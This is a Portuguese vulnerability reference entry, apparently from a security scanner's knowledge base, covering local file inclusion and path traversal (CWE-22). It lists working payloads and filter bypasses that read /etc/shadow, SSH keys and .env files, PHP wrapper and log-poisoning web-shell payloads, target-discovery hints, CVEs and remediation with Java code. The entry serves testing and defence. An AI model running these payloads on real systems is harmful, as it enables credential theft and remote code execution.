---
id: lfi
title: "Local File Inclusion / Path Traversal"
module: "lfi"
severity: "HIGH"
cwe_id: "CWE-22"
cwe_title: "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
vrt_id: "server_security_misconfiguration.path_traversal"
---

## Summary
Parâmetros que controlam caminhos de arquivo permitem escapar do diretório permitido e ler, incluir ou executar arquivos locais, expondo segredos e, em alguns casos, levando a RCE.

## Description
LFI/path traversal ocorre quando a aplicação usa entrada do usuário em operações de arquivo (`include`, `require`, `readFile`, `FileInputStream`, `sendFile`, `template`) sem canonicalizar e validar o caminho. O atacante usa `../` e variações codificadas para sair do diretório base.

Variantes:
- **Path traversal:** leitura de `/etc/passwd`, `.env`, chaves SSH, configurações.
- **LFI:** inclusão de arquivo local em PHP/Java/Python, podendo executar código se o arquivo contiver PHP/script.
- **Log poisoning:** injetar código em logs e incluí-los via LFI.
- **PHP wrappers:** `php://filter`, `php://input`, `data://`, `expect://`.
- **Conversão de arquivos:** SVG/avatar/PDF que processa caminhos internos.
- **Arquivos temporários/uploads:** combinar upload + LFI para RCE.

## Impact
- Leitura de segredos: `.env`, `config.php`, chaves, credenciais de banco/cloud.
- Exfiltração de código-fonte e dados de usuários.
- RCE quando há inclusão de código ou wrappers.
- Movimento lateral e comprometimento do host.
- Impacto HIGH; CRITICAL com RCE.

## Payloads and Bypasses
```text
# Travessia básica
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hostname
../../../../proc/self/environ
../../../../home/user/.ssh/id_rsa
../../../../var/www/html/.env
../../../../app/config/database.yml

# Variações de encoding
..%2f..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%252f%2e%2e%252fetc%252fpasswd
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%afetc/passwd
..%5c..%5c..%5cwindows%5cwin.ini
....//....//....//etc/passwd
..././..././..././etc/passwd
..;/..;/..;/etc/passwd

# Null byte (PHP antigo)
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg

# Wrappers PHP
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
zip://uploads/avatar.zip%23shell.php
phar://uploads/avatar.phar/shell.php

# Log poisoning
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
../../../../proc/self/fd/2
```

Payloads de log poisoning (enviar no User-Agent):
```http
GET /?file=../../../../var/log/apache2/access.log HTTP/1.1
Host: alvo.com
User-Agent: <?php system($_GET['c']); ?>
```

```text
# Windows
..\..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
C:\Windows\System32\drivers\etc\hosts
```

Bypasses de filtros:
```text
- Dupla codificação (%252e%252e%252f)
- Unicode/overlong (%c0%ae%c0%ae/)
- Separatórios alternativos (..\)
- Prefixo permitido + traversal (uploads/../../etc/passwd)
- Remover extensão obrigatória com null byte
- Wrappers e phar
- Inclusão de arquivo temporário enviado por upload
- Path truncation em sistemas antigos
```

Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (downloads/templates) mostram leitura de arquivos e log poisoning; o atacante testa `../`, wrappers PHP, upload + LFI e caminhos absolutos.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2019-19781 | Citrix ADC/Gateway | 2019 | Path traversal sem autenticacao -- leitura de config e RCE via template injection encadeado | Path traversal + RCE |
| CVE-2020-5410 | Spring Cloud Config | 2020 | Path traversal via symlink permite leitura de arquivos arbitrarios do servidor | Path traversal |
| CVE-2021-21972 | VMware vCenter | 2021 | Path traversal + upload no plugin vSphere Client -- RCE pre-auth | Upload + path traversal |
| CVE-2021-41773 | Apache HTTP Server 2.4.49 | 2021 | Normalizacao de path quebrada permite directory traversal com %2e -- leitura de arquivo e CGI RCE | Path traversal |
| CVE-2021-42013 | Apache HTTP Server 2.4.50 | 2021 | Bypass do fix de CVE-2021-41773 com double-encoding (%%32%65) -- mesma exploracao | Double-encoding bypass |
| CVE-2023-25690 | Apache HTTP Server | 2023 | Request smuggling via mod_proxy com RewriteRule -- manipulacao de path interno | Smuggling + path traversal |
| CVE-2024-4577 | PHP (Windows CGI) | 2024 | Arg injection em PHP-CGI via Best-Fit encoding no Windows -- leitura de arquivo e RCE | Arg injection + file read |
| CVE-2024-21887 | Ivanti Connect Secure | 2024 | Command injection em componente web -- encadeado com auth bypass para RCE pre-auth | Command injection |
| CVE-2024-23897 | Jenkins CLI | 2024 | Leitura arbitraria de arquivo via parser de argumentos com '@' -- expandsAtFiles | File read via CLI |

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `file`, `path`, `page`, `template`, `lang`, `locale`, `include`, `require`, `view`, `doc`, `folder`, `download`, `filename`, `image`, `attachment`, `module`, `theme`, `layout`.
- **Paths comuns:** `/download`, `/file`, `/view`, `/include`, `/template`, `/locale`, `/lang`, `/export`, `/attachment`, `/image`, `/api/files`, `/render`.
- **Sinais:** parâmetro com nome de arquivo; erro "No such file"; resposta com conteúdo de arquivo; `Content-Disposition`; upload + visualização.

## Recommendation
1. Não usar entrada do usuário diretamente em caminhos. Mapear IDs/chaves para arquivos em allowlist server-side.
2. Canonicalizar o caminho (`realpath`, `Path.toRealPath`) e verificar se permanece dentro do diretório base.
3. Rejeitar `..`, separadores alternativos, bytes nulos e caracteres de controle após decodificação.
4. Usar allowlist de extensões e nomes; nunca permitir caminhos absolutos.
5. Desabilitar wrappers perigosos (`allow_url_include=Off`, `expect` desabilitado) e restringir `open_basedir` no PHP.
6. Executar o serviço de arquivos em sandbox/chroot, com filesystem read-only e sem segredos.
7. Servir downloads por URLs assinadas e objetos de storage, não por path direto.
8. Exemplo Java:
```java
Path base = Path.of("/srv/app/files").toRealPath();
Path requested = base.resolve(userInput).normalize().toRealPath();
if (!requested.startsWith(base)) throw new SecurityException("path traversal");
if (!Files.isRegularFile(requested)) throw new NotFoundException();
```
9. Monitorar tentativas com `../`, `%2e%2e`, wrappers e acessos a `/etc/passwd`; alertar.
